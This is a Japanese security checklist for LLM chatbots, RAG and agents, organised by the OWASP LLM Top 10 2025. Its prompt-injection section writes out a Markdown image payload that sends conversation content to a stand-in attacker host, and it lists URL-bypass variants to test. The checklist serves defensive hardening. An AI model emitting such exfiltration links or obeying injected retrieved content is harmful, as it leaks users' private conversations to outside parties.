# LLM アプリ（チャットボット・RAG・エージェント）のチェックリスト

OWASP Top 10 for LLM Applications 2025 を、Web アプリとして実装するときの確認項目に落としたもの。
★ = 一般に見落とされがちな項目。

## LLM01 プロンプトインジェクション / LLM05 出力の不適切な扱い

- [ ] ★ モデルの出力を Markdown として描画するとき、外部の画像を読み込まない
  - 画像はクリックなしで読み込まれるため、`![](https://攻撃者/?q=<会話の内容>)` を出力させると会話が外へ送られる
  - Streamdown / react-markdown の既定は任意の画像を表示する。`allowedImagePrefixes` を自分のオリジンに限定し、`defaultOrigin` を指定する
  - 確認: 似せたドメイン（`app.example.com.evil.example`）、`@` 付き、プロトコル相対（`//evil`）、`data:` もブロックされるか、実際に描画して HTML を見る
- [ ] モデルの出力を HTML として描画していない（`rehype-raw` や `dangerouslySetInnerHTML` を使っていない）
- [ ] `javascript:` / `data:` リンクがブロックされる（多くのライブラリは既定でブロックするが、実物で確認する）
- [ ] ★ 「リンクやカードは許可リストから描画し、LLM に URL を作らせない」という方針が、プロンプトだけでなく画面側でも強制されているか（強制しない場合は、そう判断した理由を記録する）
- [ ] RAG の取り込み元（Web 取得、アップロードされた文書）にインジェクションが入りうるなら、ツール実行・外部送信の権限を絞る

## LLM02 機密情報の開示 / LLM07 システムプロンプトの漏洩

- [ ] API キーはサーバー専用（Next.js なら `server-only` を import したモジュールに閉じ込め、`NEXT_PUBLIC_` を付けない）
- [ ] ★ ビルド済みのクライアント JS に鍵が入っていない（`grep -r '<鍵の接頭辞>' .next/static` が 0 件）
- [ ] システムプロンプトに秘密情報（内部 URL、鍵、顧客情報）を入れていない。漏れても困らない前提で書く
- [ ] ナレッジに公開してよい情報だけを入れている。会話履歴の保存期間と削除方法が決まっている

## LLM06 過剰な権限

- [ ] モデルが呼べるツール（HTTP リクエスト、コード実行、DB 書き込み）を最小限にしている
- [ ] ツールが使う認証情報が、そのツールに必要な範囲だけに絞られている

## LLM10 無制限な消費（課金）

- [ ] ★ LLM を呼ぶ API が認証なしで呼べる場合、レート制限・1回あたりの上限（質問の長さ、添付の数、全体サイズ）・月間の上限がある
- [ ] ★ LLM を呼ぶのはチャット本体だけとは限らない（会話名の自動生成、要約、埋め込み、提案質問）。すべて洗い出した
- [ ] 他サイトから埋め込めない／ブラウザから API を呼べない（CSRF と `frame-ancestors`。`checklists/web-api.md`）
- [ ] プロバイダ側の月間上限とアラートを設定している（ダッシュボード。利用者に確認）

## 上流プラットフォーム（Dify など）の設定

- [ ] ファイルアップロード、画像 URL の受け付け、入力変数の型と最大長など、受け付けるものをアプリ設定で絞っている
- [ ] ★ サーバー側の検証と上流の設定のどちらが何を守るか、役割分担を決めて記録している（両方で厳しく絞ると正当な操作を壊しやすい）
- [ ] 上流の SDK の型定義と実装が一致しているか（食い違っていると、キャストで無理に通した箇所に誤りが入りやすい）
